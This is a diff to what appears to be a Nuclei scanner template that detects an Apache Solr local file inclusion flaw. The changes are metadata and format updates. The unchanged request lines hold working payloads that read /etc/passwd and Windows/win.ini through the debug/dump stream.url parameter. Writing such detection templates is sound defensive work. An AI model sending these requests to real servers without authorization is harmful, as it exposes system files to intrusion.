@@ -12,23 +12,23 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
-  tags: apache,solr,lfi
+    cwe-id: CWE-23,CWE-73
+  metadata:
+    max-request: 3
+  tags: apache,solr,lfi,vuln
 
-requests:
+http:
   - raw:
       - |
         GET /solr/admin/cores?wt=json HTTP/1.1
         Host: {{Hostname}}
         Accept-Language: en
         Connection: close
-
       - |
         GET /solr/{{core}}/debug/dump?stream.url=file:///../../../../../Windows/win.ini&param=ContentStream HTTP/1.1
         Host: {{Hostname}}
         Accept-Language: en
         Connection: close
-
       - |
         GET /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream HTTP/1.1
         Host: {{Hostname}}
@@ -36,6 +36,7 @@ requests:
         Connection: close
 
     stop-at-first-match: true
+
     matchers-condition: or
     matchers:
       - type: word
@@ -57,5 +58,4 @@ requests:
         regex:
           - '"name"\:"(.*?)"'
         internal: true
-
-# Enhanced by mp on 2023/01/15
+# digest: 490a004630440220417b8742255aa140dafc68f37a608e18d468fb6bc96bf1e038a292b801067eb202202efdbf89c4c5a29bb929b191fefcbb003e2fae04b1761ca1d2ea6b6bd1d869ab:922c64590222798bb761d5b6d8e72950
